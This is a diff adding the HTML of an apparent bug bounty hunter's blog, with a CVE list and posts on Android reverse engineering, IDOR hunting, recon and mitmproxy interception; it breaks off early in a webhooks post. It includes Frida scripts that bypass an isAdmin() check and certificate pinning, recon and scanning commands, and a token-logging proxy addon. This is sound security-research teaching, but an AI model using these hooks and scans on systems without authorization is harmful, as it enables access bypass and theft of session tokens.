@@ -1,0 +1,889 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>bruno menna</title>
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='10 0 80 100'><text x='10' y='.9em' font-size='100' font-weight='bold' fill='%2300ff41'>⟩</text></svg>">
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&display=swap');
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      background: #0e0d0b url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.015'/%3E%3C/svg%3E");
+      color: #b0a080;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+      line-height: 1.9;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    body::before {
+      content: '';
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      pointer-events: none;
+      z-index: 9998;
+      background: radial-gradient(ellipse at center, transparent 60%, rgba(0,0,0,0.4) 100%);
+    }
+
+    body::after {
+      content: '';
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      pointer-events: none;
+      z-index: 9999;
+      background: repeating-linear-gradient(
+        0deg,
+        rgba(0,0,0,0.08) 0px,
+        rgba(0,0,0,0.08) 1px,
+        transparent 1px,
+        transparent 3px
+      );
+    }
+
+    ::selection { background: #ffb00030; color: #fff; }
+
+    a { color: #d4c4a0; text-decoration: none; transition: color 0.2s; }
+    a:hover { color: #ffb000; }
+
+    .wrap {
+      max-width: 620px;
+      margin: 0 auto;
+      padding: 100px 24px 140px;
+    }
+
+    /* ── HEADER ── */
+    header {
+      margin-bottom: 80px;
+      position: relative;
+    }
+
+    header::before {
+      content: '';
+      position: absolute;
+      top: -60px;
+      left: -80px;
+      width: 300px;
+      height: 200px;
+      background: radial-gradient(ellipse at center, rgba(255,176,0,0.04) 0%, transparent 70%);
+      pointer-events: none;
+      z-index: -1;
+    }
+
+    .name {
+      font-size: 15px;
+      font-weight: 500;
+      color: #ddd;
+      margin-bottom: 6px;
+    }
+
+    .name span { color: #ffb000; text-shadow: 0 0 8px rgba(255,176,0,0.4); }
+
+    .tagline {
+      color: #5a5040;
+      font-size: 12px;
+    }
+
+    .social { color: #5a5040; font-size: 11px; }
+    .social:hover { color: #ffb000; }
+
+    /* ── CVE TABLE ── */
+    .cve-table {
+      margin-top: 32px;
+      padding-top: 24px;
+      border-top: 1px solid #151515;
+      font-size: 12px;
+    }
+
+    .cve-table-title {
+      color: #5a5040;
+      font-size: 11px;
+      margin-bottom: 16px;
+      letter-spacing: 1px;
+    }
+
+    .cve-row {
+      display: flex;
+      gap: 16px;
+      padding: 8px 0;
+      border-bottom: 1px solid #111;
+      align-items: baseline;
+    }
+
+    .cve-id {
+      color: #5a5040;
+      flex-shrink: 0;
+      min-width: 145px;
+    }
+
+    .cve-id a { color: #5a5040; font-size: 12px; }
+    .cve-id a:hover { color: #ffb000; }
+
+    .cve-app {
+      color: #8a7a60;
+      flex-shrink: 0;
+      min-width: 110px;
+    }
+
+    .cve-desc {
+      color: #6a5a40;
+    }
+
+    .cve-sev {
+      font-size: 10px;
+      padding: 1px 6px;
+      flex-shrink: 0;
+      letter-spacing: 0.5px;
+    }
+
+    .sev-high { color: #ff5f57; background: rgba(255,95,87,0.08); }
+    .sev-medium { color: #febc2e; background: rgba(254,188,46,0.08); }
+    .sev-critical { color: #ff3333; background: rgba(255,51,51,0.1); }
+
+    /* ── NAV ── */
+    nav {
+      display: flex;
+      gap: 28px;
+      margin-bottom: 64px;
+      font-size: 12px;
+    }
+
+    nav a { color: #5a5040; transition: color 0.2s; }
+    nav a.active { color: #ffb000; text-shadow: 0 0 8px rgba(255,176,0,0.3); }
+    nav a:hover { color: #ffb000; }
+
+    .nav-sep { color: #1a1a1a; margin: 0 4px; user-select: none; }
+
+    .sep {
+      color: #1a1a1a;
+      margin-bottom: 48px;
+      font-size: 11px;
+      letter-spacing: 2px;
+      user-select: none;
+    }
+
+    /* ── PAGES ── */
+    .page {
+      display: none;
+      opacity: 0;
+      transform: translateY(6px);
+      transition: opacity 0.3s, transform 0.3s;
+    }
+
+    .page.visible {
+      display: block;
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    /* ── POSTS ── */
+    .post {
+      display: flex;
+      align-items: baseline;
+      gap: 20px;
+      padding: 18px 0;
+      border-bottom: 1px solid #151515;
+      transition: border-color 0.3s, transform 0.2s;
+    }
+
+    .post:hover { border-color: #1f1f1f; transform: translateX(6px); }
+
+    .post-date {
+      color: #4a4030;
+      font-size: 11px;
+      flex-shrink: 0;
+      min-width: 56px;
+    }
+
+    .post:hover .post-date { color: #6a5a40; }
+
+    .post-title a {
+      color: #b0a080;
+      font-size: 13px;
+    }
+
+    .post:hover .post-title a { color: #ffb000; text-shadow: 0 0 6px rgba(255,176,0,0.2); }
+
+    /* ── ABOUT ── */
+    .about p {
+      margin-bottom: 20px;
+      color: #8a7a60;
+      max-width: 480px;
+    }
+
+    .about p strong {
+      color: #d4c4a0;
+      font-weight: 500;
+    }
+
+    .about .tools {
+      color: #5a5040;
+      font-size: 12px;
+      margin-top: 32px;
+      padding-top: 24px;
+      border-top: 1px solid #151515;
+    }
+
+    /* ── CONTACT ── */
+    .contact-line {
+      padding: 8px 0;
+    }
+
+    .contact-line a { color: #8a7a60; }
+    .contact-line a:hover { color: #ffb000; }
+
+    /* ── POST PAGE ── */
+    .back {
+      color: #5a5040;
+      font-size: 12px;
+      display: inline-block;
+      margin-bottom: 40px;
+    }
+
+    .back:hover { color: #ffb000; }
+
+    .post-page h1 {
+      font-size: 16px;
+      font-weight: 500;
+      color: #d4c4a0;
+      margin-bottom: 8px;
+    }
+
+    .post-page .meta {
+      color: #5a5040;
+      font-size: 11px;
+      margin-bottom: 40px;
+    }
+
+    .post-page .content {
+      color: #b0a080;
+      font-size: 13px;
+      line-height: 2;
+    }
+
+    .post-page .content p {
+      margin-bottom: 24px;
+      max-width: 540px;
+    }
+
+    .post-page .content code {
+      color: #ffb000;
+      background: #111;
+      padding: 2px 6px;
+      font-size: 12px;
+    }
+
+    .post-page .content pre {
+      background: #111;
+      padding: 20px;
+      margin: 24px 0;
+      overflow-x: auto;
+      font-size: 12px;
+      color: #8a7a60;
+      border-left: 2px solid #1a1a1a;
+    }
+
+    .post-page .content pre .g { color: #ffb000; }
+    .post-page .content pre .y { color: #d4c4a0; }
+    .post-page .content pre .c { color: #4a4030; }
+
+    /* ── FOOTER ── */
+    footer {
+      margin-top: 96px;
+      color: #1a1a1a;
+      font-size: 11px;
+    }
+
+    /* ── CURSOR ── */
+    .cursor {
+      display: inline-block;
+      width: 7px;
+      height: 13px;
+      background: #ffb000;
+      box-shadow: 0 0 6px rgba(255,176,0,0.5);
+      animation: blink 1.2s step-end infinite;
+      vertical-align: middle;
+      margin-left: 1px;
+      opacity: 0.7;
+    }
+
+    @keyframes blink { 50% { opacity: 0; } }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(6px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    header, nav, .page, footer {
+      animation: fadeIn 0.6s ease both;
+    }
+
+    nav { animation-delay: 0.15s; }
+    .page { animation-delay: 0.3s; }
+    footer { animation-delay: 0.45s; }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+
+    <header>
+      <div class="name"><span>~</span> <span class="typed" id="typed"></span></div>
+      <div class="tagline"><a href="https://www.linkedin.com/in/bruno-menna/" class="social">linkedin ↗</a></div>
+    </header>
+
+    <nav>
+      <a href="#" class="active" onclick="show('posts',this);return false">posts</a>
+      <span class="nav-sep">/</span>
+      <a href="#" onclick="show('about',this);return false">about</a>
+    </nav>
+
+    <div class="sep">────────────────────────────────</div>
+
+    <!-- POSTS -->
+    <div id="posts" class="page visible">
+      <div class="post">
+        <div class="post-date">apr 10</div>
+        <div class="post-title"><a href="#" onclick="show('post-jadx',null);return false">reverse engineering android apps with jadx + frida</a></div>
+      </div>
+      <div class="post">
+        <div class="post-date">apr 03</div>
+        <div class="post-title"><a href="#" onclick="show('post-idor',null);return false">finding idors at scale</a></div>
+      </div>
+      <div class="post">
+        <div class="post-date">mar 22</div>
+        <div class="post-title"><a href="#" onclick="show('post-recon',null);return false">my recon methodology: from scope to first bug</a></div>
+      </div>
+      <div class="post">
+        <div class="post-date">mar 15</div>
+        <div class="post-title"><a href="#" onclick="show('post-webhooks',null);return false">broken access control in webhook implementations</a></div>
+      </div>
+      <div class="post">
+        <div class="post-date">mar 01</div>
+        <div class="post-title"><a href="#" onclick="show('post-mitmproxy',null);return false">mitmproxy setup for mobile interception</a></div>
+      </div>
+    </div>
+
+    <!-- ABOUT -->
+    <div id="about" class="page about">
+      <p>i'm a product security engineer at mindbody/classpass. day to day i work on security pipelines, automation, secret scanning, responsible disclosure program, occasional pentests, and ai-powered triage for tool findings.</p>
+      <p>into appsec, supply chain security, bug bounty, and security research. i like breaking things to understand how they work.</p>
+      <p>16 cves published. acknowledged by apple, microsoft, and the u.s. department of health and human services.</p>
+      <div class="cve-table">
+        <div class="cve-table-title">some of my cves</div>
+        <div class="cve-row">
+          <span class="cve-id"><a href="https://github.com/coollabsio/coolify/security/advisories/GHSA-46hp-7m8g-7622">CVE-2026-34153</a></span>
+          <span class="cve-app"><a href="https://github.com/coollabsio/coolify" class="social">coolify</a></span>
+          <span class="cve-desc">rce via localfilevolume fs_path injection</span>
+          <span class="cve-sev sev-critical">critical</span>
+        </div>
+        <div class="cve-row">
+          <span class="cve-id"><a href="https://github.com/coollabsio/coolify/security/advisories/GHSA-5qp8-9gg7-4c86">CVE-2026-34152</a></span>
+          <span class="cve-app"><a href="https://github.com/coollabsio/coolify" class="social">coolify</a></span>
+          <span class="cve-desc">command injection via newline in deployment commands</span>
+          <span class="cve-sev sev-critical">critical</span>
+        </div>
+        <div class="cve-row">
+          <span class="cve-id"><a href="https://github.com/danny-avila/LibreChat/security/advisories/GHSA-w5r7-4f94-vp4c">CVE-2026-31943</a></span>
+          <span class="cve-app"><a href="https://github.com/danny-avila/LibreChat" class="social">librechat</a></span>
+          <span class="cve-desc">ssrf protection bypass via ipv4-mapped ipv6</span>
+          <span class="cve-sev sev-high">high</span>
+        </div>
+        <div class="cve-row">
+          <span class="cve-id"><a href="https://github.com/Stirling-Tools/Stirling-PDF/security/advisories/GHSA-hg2c-wm3r-f7xx">GHSA-hg2c-wm3r-f7xx</a></span>
+          <span class="cve-app"><a href="https://github.com/Stirling-Tools/Stirling-PDF" class="social">stirling-pdf</a></span>
+          <span class="cve-desc">ssrf via missing rfc 6598 range in ip validation</span>
+          <span class="cve-sev sev-high">high</span>
+        </div>
+        <div class="cve-row">
+          <span class="cve-id"><a href="https://github.com/QuantumNous/new-api/security/advisories/GHSA-6qcr-qxgr-m7fv">CVE-2026-33655</a></span>
+          <span class="cve-app"><a href="https://github.com/QuantumNous/new-api" class="social">new-api</a></span>
+          <span class="cve-desc">ssrf bypass via unresolved hostname in notification urls</span>
+          <span class="cve-sev sev-high">high</span>
+        </div>
+        <div class="cve-row">
+          <span class="cve-id"><a href="https://github.com/goauthentik/authentik/security/advisories/GHSA-h6x7-hjjc-wjc9">CVE-2026-40172</a></span>
+          <span class="cve-app"><a href="https://github.com/goauthentik/authentik" class="social">authentik</a></span>
+          <span class="cve-desc">privilege escalation via superuser group assignment</span>
+          <span class="cve-sev sev-high">high</span>
+        </div>
+        <div class="cve-row">
+          <span class="cve-id"><a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-r745-8hwv-h473">GHSA-r745-8hwv</a></span>
+          <span class="cve-app"><a href="https://github.com/FlowiseAI/Flowise" class="social">flowise</a></span>
+          <span class="cve-desc">unauth oauth2 refresh — non-blind ssrf + secret exfil</span>
+          <span class="cve-sev sev-high">high</span>
+        </div>
+        <div class="cve-row">
+          <span class="cve-id"><a href="https://github.com/traefik/traefik/security/advisories/GHSA-67jx-r9pv-98rj">CVE-2026-32695</a></span>
+          <span class="cve-app"><a href="https://github.com/traefik/traefik" class="social">traefik</a></span>
+          <span class="cve-desc">ingress rule injection — host restriction bypass</span>
+          <span class="cve-sev sev-medium">medium</span>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- POST: JADX + FRIDA -->
+    <div id="post-jadx" class="page post-page">
+      <a href="#" class="back" onclick="show('posts',document.querySelector('nav a'));return false">&larr; back</a>
+      <h1>reverse engineering android apps with jadx + frida</h1>
+      <div class="meta">apr 10, 2026 &middot; 5 min read</div>
+      <div class="content">
+        <p>most android apps trust the client way too much. hidden endpoints, hardcoded keys, debug flags left in production. all you need is the right toolchain to find them.</p>
+
+        <p>the approach is simple: <code>jadx</code> for static analysis, <code>frida</code> for runtime hooking. one shows you the code, the other lets you mess with it while it runs.</p>
+
+        <p>start by pulling the apk and throwing it into jadx:</p>
+
+<pre><span class="g">$</span> adb shell pm path com.target.app
+<span class="c"># package:/data/app/com.target.app/base.apk</span>
+<span class="g">$</span> adb pull /data/app/com.target.app/base.apk
+<span class="g">$</span> jadx <span class="y">--decompile</span> base.apk <span class="y">-d</span> output/</pre>
+
+        <p>look for api endpoints, auth logic, anything interesting. grep is your friend here. search for strings like <code>/api/</code>, <code>Authorization</code>, <code>Bearer</code>, <code>secret</code>.</p>
+
+<pre><span class="g">$</span> grep <span class="y">-rni</span> "api" output/sources/ | head <span class="y">-20</span>
+<span class="g">$</span> grep <span class="y">-rni</span> "secret\|key\|token" output/sources/</pre>
+
+        <p>once you find something interesting, hook it with frida to see what's happening at runtime. say you found an <code>isAdmin()</code> check:</p>
+
+<pre><span class="c">// bypass.js</span>
+Java.perform(function() {
+  var auth = Java.use(<span class="y">"com.target.app.AuthManager"</span>);
+  auth.isAdmin.implementation = function() {
+    console.log(<span class="y">"[+] isAdmin() called, returning true"</span>);
+    return true;
+  };
+});</pre>
+
+<pre><span class="g">$</span> frida <span class="y">-U -f</span> com.target.app <span class="y">-l</span> bypass.js</pre>
+
+        <p>certificate pinning? most apps use okhttp or a custom trust manager. the idea is simple — the app validates the server's certificate against a pinned hash. if it doesn't match, the connection drops. but since we control the runtime, we just hook the check and make it always pass.</p>
+
+        <p>for okhttp-based pinning, the target is usually <code>CertificatePinner.check()</code>:</p>
+
+<pre><span class="c">// ssl_bypass.js</span>
+Java.perform(function() {
+  var CertPinner = Java.use(<span class="y">"okhttp3.CertificatePinner"</span>);
+  CertPinner.check.overload(
+    <span class="y">"java.lang.String"</span>,
+    <span class="y">"java.util.List"</span>
+  ).implementation = function(hostname, peerCerts) {
+    console.log(<span class="y">"[+] bypassing pin for: "</span> + hostname);
+    return;
+  };
+});</pre>
+
+        <p>for apps using a custom <code>TrustManager</code>, you need to find the class that implements <code>X509TrustManager</code> and hook <code>checkServerTrusted()</code>:</p>
+
+<pre><span class="c">// trustmanager_bypass.js</span>
+Java.perform(function() {
+  var tm = Java.use(<span class="y">"com.target.app.CustomTrustManager"</span>);
+  tm.checkServerTrusted.implementation = function(chain, authType) {
+    console.log(<span class="y">"[+] trusting all certs"</span>);
+    return;
+  };
+});</pre>
+
+        <p>run it the same way:</p>
+
+<pre><span class="g">$</span> frida <span class="y">-U -f</span> com.target.app <span class="y">-l</span> ssl_bypass.js</pre>
+
+        <p>now all traffic flows through your proxy. point the device to burp, and you're intercepting every request the app makes — auth tokens, api calls, everything.</p>
+
+        <p>one thing to watch out for: some apps stack multiple pinning layers. you might bypass okhttp but still get blocked by a native check. in that case, look for <code>libssl</code> hooks or use something like <code>objection</code> which covers most common cases out of the box.</p>
+
+        <p>the real value isn't in any single trick. it's in chaining static findings with dynamic confirmation. jadx tells you what the code <em>could</em> do. frida tells you what it <em>actually</em> does.</p>
+      </div>
+    </div>
+
+
+    <!-- POST: IDOR -->
+    <div id="post-idor" class="page post-page">
+      <a href="#" class="back" onclick="show('posts',document.querySelector('nav a'));return false">&larr; back</a>
+      <h1>finding idors at scale</h1>
+      <div class="meta">apr 03, 2026 &middot; 7 min read</div>
+      <div class="content">
+        <p>idor — insecure direct object reference. it's been on the owasp top 10 for years and it's still everywhere. the concept is almost embarrassingly simple: change an id in a request, get someone else's data. and yet it remains one of the most rewarding bug classes to hunt for.</p>
+
+        <p>i think the reason it persists is that it's not really a coding mistake. it's an architecture mistake. developers build features around objects — users, orders, documents — and forget to ask the most basic question: does this person have permission to access this specific object?</p>
+
+        <p><strong>the mindset</strong></p>
+
+        <p>the first thing to understand is that idor isn't just "change the id and see what happens." that's the mechanic, not the methodology. the real skill is understanding how the application models ownership and access.</p>
+
+        <p>every app has a hierarchy. users belong to organizations. orders belong to users. documents belong to projects. the question is always: where does the app check that chain of ownership, and where does it skip?</p>
+
+        <p>most apps get the obvious ones right. <code>/api/users/123/profile</code> probably checks if you're user 123. but what about <code>/api/users/123/invoices</code>? or <code>/api/users/123/api-keys</code>? the deeper you go into the object graph, the more likely someone forgot a check.</p>
+
+        <p><strong>the two-account approach</strong></p>
+
+        <p>always test with two accounts. always. you can't find access control bugs with a single session. create account A (the victim) and account B (the attacker). use the app fully as account A — create data, upload files, configure settings. then try to access all of it as account B.</p>
+
+        <p>this sounds obvious but most people skip it because it's tedious. setting up two accounts with realistic data takes time. but it's the foundation of every idor you'll ever find.</p>
+
+        <p><strong>where to look</strong></p>
+
+        <p>after testing hundreds of apps, these are the places where idors show up most consistently:</p>
+
+        <p><em>api endpoints that accept an id you didn't choose.</em> if you're making a request and the id came from a url, a dropdown, a hidden field, or a previous api response — that's a candidate. the app gave you that id, but does it verify you should have it?</p>
+
+        <p><em>export and download features.</em> generating a pdf report, exporting csv data, downloading an attachment. these are often built as separate services that receive an object id and return the file. the auth check happens in the main app, but the export service just trusts the id it receives.</p>
+
+        <p><em>notification and activity endpoints.</em> "get my recent activity" or "get my notifications" often leak data because they aggregate from multiple sources. the aggregation layer might not enforce the same permissions as each individual source.</p>
+
+        <p><em>admin and settings endpoints.</em> changing org settings, managing team members, updating billing info. these are high-value targets because the impact of unauthorized access is severe. and they're often less tested because fewer people use them.</p>
+
+        <p><em>GraphQL.</em> graphql makes idor testing interesting because the client controls the query structure. you can ask for nested relationships — "give me this project's organization's other projects" — and find paths the developers never intended to expose.</p>
+
+        <p><strong>the uuid trap</strong></p>
+
+        <p>a lot of developers think using uuids instead of sequential ids prevents idor. it doesn't. uuids make enumeration harder, but they don't solve the access control problem. if i can get your uuid from anywhere — a shared link, an api response, a websocket message, an email — i can still use it.</p>
+
+        <p>places uuids leak constantly: invitation links, public profiles, shared documents, api list endpoints, error messages, and javascript source files. once you have one valid uuid, you can test every endpoint that accepts it.</p>
+
+        <p><strong>beyond read access</strong></p>
+
+        <p>here's what separates a medium finding from a critical one: don't stop at reading data. test write and delete operations too.</p>
+
+        <p>can account B modify account A's profile? update their email address? change their password? that's account takeover through idor — critical severity.</p>
+
+        <p>can account B delete account A's projects? remove their team members? cancel their subscription? that's destructive idor — also critical.</p>
+
+        <p>most hunters stop at "i can see another user's data." that's valid, but the real impact comes from testing what else you can do with that access.</p>
+
+        <p><strong>the subtle ones</strong></p>
+
+        <p>the best idors aren't obvious. they hide in features you wouldn't think to test:</p>
+
+        <p>— search endpoints that accept a <code>scope</code> or <code>org_id</code> filter and return results from that scope without checking membership<br>
+        — webhook configurations where you can point someone else's events to your url<br>
+        — file upload endpoints where the <code>parent_id</code> determines which project the file lands in<br>
+        — sso and saml flows where the <code>account_id</code> in the assertion isn't validated against the authenticated session<br>
+        — api key management where you can list or revoke keys belonging to another user</p>
+
+        <p>these are the findings that make programs pay attention. not because they're technically complex, but because they show a deep understanding of how the application works.</p>
+
+        <p><strong>writing the report</strong></p>
+
+        <p>when you find an idor, the report matters as much as the finding. always include: what you accessed, whose data it was, and what an attacker could do with it. don't just say "i changed the id and got a 200." explain the business impact. "an attacker can read any customer's invoices, including billing addresses, payment amounts, and line items" hits different than "idor on /api/invoices/:id."</p>
+
+        <p>idor isn't going away. as long as apps have objects and users, there will be missing access checks. the hunters who find them consistently aren't the ones with the best tools — they're the ones who understand the application deeply enough to know where to look.</p>
+      </div>
+    </div>
+
+    <!-- POST: RECON -->
+    <div id="post-recon" class="page post-page">
+      <a href="#" class="back" onclick="show('posts',document.querySelector('nav a'));return false">&larr; back</a>
+      <h1>my recon methodology: from scope to first bug</h1>
+      <div class="meta">mar 22, 2026 &middot; 10 min read</div>
+      <div class="content">
+        <p>recon is the part that separates finding one bug from finding ten. most people jump straight into testing — i spend the first hours just mapping the target. the more surface you uncover, the more entry points you have.</p>
+
+        <p>here's the exact workflow i follow when i start a new program.</p>
+
+        <p><strong>1. subdomain enumeration</strong></p>
+
+        <p>start wide. pull subdomains from as many sources as possible and merge them:</p>
+
+<pre><span class="c"># passive enum from multiple sources</span>
+<span class="g">$</span> subfinder <span class="y">-d</span> target.com <span class="y">-o</span> subs_subfinder.txt
+<span class="g">$</span> amass enum <span class="y">-passive -d</span> target.com <span class="y">-o</span> subs_amass.txt
+<span class="g">$</span> github-subdomains <span class="y">-d</span> target.com <span class="y">-t</span> GITHUB_TOKEN <span class="y">-o</span> subs_github.txt
+
+<span class="c"># merge and deduplicate</span>
+<span class="g">$</span> cat subs_*.txt | sort <span class="y">-u</span> > all_subs.txt
+<span class="g">$</span> wc <span class="y">-l</span> all_subs.txt
+<span class="c"># 847 unique subdomains</span></pre>
+
+        <p>don't skip github dorking. you'd be surprised how many internal subdomains, staging environments, and api endpoints show up in public repos.</p>
+
+        <p><strong>2. probing live hosts</strong></p>
+
+        <p>not all subdomains resolve. filter for what's actually alive:</p>
+
+<pre><span class="g">$</span> cat all_subs.txt | httpx <span class="y">-silent -status-code -title -tech-detect</span> \
+  <span class="y">-o</span> live_hosts.txt
+
+<span class="c"># quick look at what we're dealing with</span>
+<span class="g">$</span> cat live_hosts.txt | grep <span class="y">"200"</span> | wc <span class="y">-l</span>
+<span class="c"># 312 live hosts returning 200</span></pre>
+
+        <p>httpx with <code>-tech-detect</code> is key — it tells you what stack each host runs. react frontend? spring backend? nginx? knowing the tech narrows your attack surface immediately.</p>
+
+        <p><strong>3. javascript analysis</strong></p>
+
+        <p>js files are a goldmine. they leak api endpoints, internal paths, tokens, and sometimes entire api schemas. pull them all and grep:</p>
+
+<pre><span class="c"># extract js urls from live hosts</span>
+<span class="g">$</span> cat live_hosts.txt | getJS <span class="y">--complete</span> | sort <span class="y">-u</span> > js_files.txt
+
+<span class="c"># download them all</span>
+<span class="g">$</span> cat js_files.txt | xargs <span class="y">-P 10 -I{}</span> wget <span class="y">-q</span> {} <span class="y">-P</span> js_downloads/
+
+<span class="c"># hunt for endpoints</span>
+<span class="g">$</span> grep <span class="y">-rhoP</span> '"/api/[a-zA-Z0-9_/]+"' js_downloads/ | sort <span class="y">-u</span>
+<span class="c"># /api/v1/users
+# /api/v1/admin/settings
+# /api/internal/debug
+# /api/v2/webhooks</span></pre>
+
+        <p><code>/api/internal/debug</code> — that shouldn't be there. those are the findings that make recon worth it.</p>
+
+        <p>also look for hardcoded keys and secrets:</p>
+
+<pre><span class="g">$</span> grep <span class="y">-rniE</span> "(api_key|apikey|secret|token|password|aws_)" js_downloads/
+<span class="g">$</span> nuclei <span class="y">-l</span> js_files.txt <span class="y">-t</span> exposures/tokens/</pre>
+
+        <p><strong>4. api discovery</strong></p>
+
+        <p>with the endpoints from js analysis, start building an api map. i usually check for openapi/swagger docs first:</p>
+
+<pre><span class="c"># common swagger/openapi paths</span>
+<span class="g">$</span> cat live_hosts.txt | while read host; do
+  for path in /swagger.json /openapi.json /api-docs /swagger-ui/ /docs; do
+    code=<span class="y">$(</span>curl <span class="y">-so /dev/null -w</span> "%{http_code}" <span class="y">$host$path</span><span class="y">)</span>
+    if [ <span class="y">"$code"</span> != <span class="y">"404"</span> ]; then
+      echo <span class="y">"$host$path [$code]"</span>
+    fi
+  done
+done</pre>
+
+        <p>finding a swagger doc is like finding the map to the treasure. every endpoint, every parameter, every model — documented.</p>
+
+        <p><strong>5. nuclei scan</strong></p>
+
+        <p>once you have your live hosts, run nuclei for quick wins:</p>
+
+<pre><span class="g">$</span> nuclei <span class="y">-l</span> live_hosts.txt \
+  <span class="y">-t</span> cves/ \
+  <span class="y">-t</span> vulnerabilities/ \
+  <span class="y">-t</span> exposures/ \
+  <span class="y">-t</span> misconfiguration/ \
+  <span class="y">-severity</span> medium,high,critical \
+  <span class="y">-o</span> nuclei_results.txt</pre>
+
+        <p>don't rely on nuclei alone — it catches known issues, not logic bugs. but it's a good first pass that can surface easy wins while you focus on manual testing.</p>
+
+        <p><strong>6. prioritize</strong></p>
+
+        <p>by now you have hundreds of hosts, endpoints, and js findings. the trick is knowing where to dig first:</p>
+
+        <p>— staging/dev environments often have weaker auth<br>
+        — admin panels exposed to the internet<br>
+        — api endpoints found in js but not in public docs<br>
+        — anything with <code>internal</code>, <code>debug</code>, or <code>legacy</code> in the path<br>
+        — endpoints that accept <code>org_id</code>, <code>user_id</code>, or <code>account_id</code> params</p>
+
+        <p>that last one is where most of my idor and bac findings come from. if an endpoint takes an id as input and returns data, test it with a different user's id. simple, effective, and still one of the most common bug classes out there.</p>
+
+        <p>recon isn't glamorous. it's running tools, reading output, connecting dots. but every serious bug i've found started with a good recon session. skip it and you're testing blind.</p>
+      </div>
+    </div>
+
+    <!-- POST: MITMPROXY -->
+    <div id="post-mitmproxy" class="page post-page">
+      <a href="#" class="back" onclick="show('posts',document.querySelector('nav a'));return false">&larr; back</a>
+      <h1>mitmproxy setup for mobile interception</h1>
+      <div class="meta">mar 01, 2026 &middot; 4 min read</div>
+      <div class="content">
+        <p>intercepting mobile app traffic is the first step in any mobile bug bounty engagement. mitmproxy is my go-to — it's free, scriptable, and works on both android and ios. here's the setup i use every time.</p>
+
+        <p>install it:</p>
+
+<pre><span class="g">$</span> pip install mitmproxy
+<span class="g">$</span> mitmproxy <span class="y">--version</span></pre>
+
+        <p>start the proxy. by default it runs on port 8080:</p>
+
+<pre><span class="g">$</span> mitmproxy <span class="y">-p</span> 8080</pre>
+
+        <p>now configure your device to use the proxy. your laptop and phone need to be on the same network. find your local ip:</p>
+
+<pre><span class="g">$</span> ifconfig | grep <span class="y">"inet "</span> | grep <span class="y">-v</span> 127.0.0.1
+<span class="c"># inet 192.168.1.42 ...</span></pre>
+
+        <p>on your phone, go to wifi settings, set the proxy to manual, enter your ip and port 8080. open a browser and navigate to <code>mitm.it</code> — this page serves the mitmproxy CA certificate.</p>
+
+        <p>download and install the cert. on android, this gets you user-level interception which works for most browser traffic. but apps targeting api 24+ only trust system-level certs by default.</p>
+
+        <p>to install as a system cert on a rooted android device:</p>
+
+<pre><span class="c"># copy the cert from ~/.mitmproxy/</span>
+<span class="g">$</span> hashed_name=<span class="y">$(</span>openssl x509 <span class="y">-inform</span> PEM \
+  <span class="y">-subject_hash_old</span> \
+  <span class="y">-in</span> ~/.mitmproxy/mitmproxy-ca-cert.cer \
+  | head <span class="y">-1</span><span class="y">)</span>
+
+<span class="g">$</span> cp ~/.mitmproxy/mitmproxy-ca-cert.cer <span class="y">$hashed_name</span>.0
+
+<span class="c"># push to device system cert store</span>
+<span class="g">$</span> adb root
+<span class="g">$</span> adb remount
+<span class="g">$</span> adb push <span class="y">$hashed_name</span>.0 /system/etc/security/cacerts/
+<span class="g">$</span> adb shell chmod 644 /system/etc/security/cacerts/<span class="y">$hashed_name</span>.0
+<span class="g">$</span> adb reboot</pre>
+
+        <p>after reboot, mitmproxy's cert is trusted at the system level. apps that don't implement certificate pinning will now send all traffic through your proxy — no complaints.</p>
+
+        <p>for apps that do implement pinning, you'll need frida to bypass it (covered in the jadx + frida post). but the proxy setup stays the same.</p>
+
+        <p>some useful mitmproxy flags i use constantly:</p>
+
+<pre><span class="c"># only intercept specific domains</span>
+<span class="g">$</span> mitmproxy <span class="y">--set</span> intercept="~d api.target.com"
+
+<span class="c"># dump traffic to a file for later analysis</span>
+<span class="g">$</span> mitmdump <span class="y">-w</span> traffic.flow
+
+<span class="c"># replay saved traffic</span>
+<span class="g">$</span> mitmdump <span class="y">-r</span> traffic.flow
+
+<span class="c"># run with a custom script (e.g. log all auth tokens)</span>
+<span class="g">$</span> mitmproxy <span class="y">-s</span> log_tokens.py</pre>
+
+        <p>speaking of scripts — mitmproxy's python api is where it gets really powerful. here's a quick addon that logs every authorization header it sees:</p>
+
+<pre><span class="c"># log_tokens.py</span>
+from mitmproxy import http
+
+def request(flow: http.HTTPFlow):
+    auth = flow.request.headers.get(<span class="y">"Authorization"</span>)
+    if auth:
+        print(f<span class="y">"[+] {flow.request.url}"</span>)
+        print(f<span class="y">"    Token: {auth}"</span>)</pre>
+
+        <p>run it and every request with an auth header gets logged. useful for understanding how an app handles sessions, token refresh, and multi-account flows.</p>
+
+        <p>that's the core setup. proxy running, cert installed, traffic flowing. from here you can start mapping endpoints, fuzzing parameters, and looking for the real bugs.</p>
+      </div>
+    </div>
+
+    <!-- POST: WEBHOOKS BAC -->
+    <div id="post-webhooks" class="page post-page">
+      <a href="#" class="back" onclick="show('posts',document.querySelector('nav a'));return false">&larr; back</a>
+      <h1>broken access control in webhook implementations</h1>
+      <div class="meta">mar 15, 2026 &middot; 6 min read</div>
+      <div class="content">
+        <p>webhooks are one of the most overlooked features in web apps. they're usually built late in the development cycle, bolted onto an existing api, and rarely get the same access control scrutiny as the core product. that makes them a goldmine for bac bugs.</p>
+
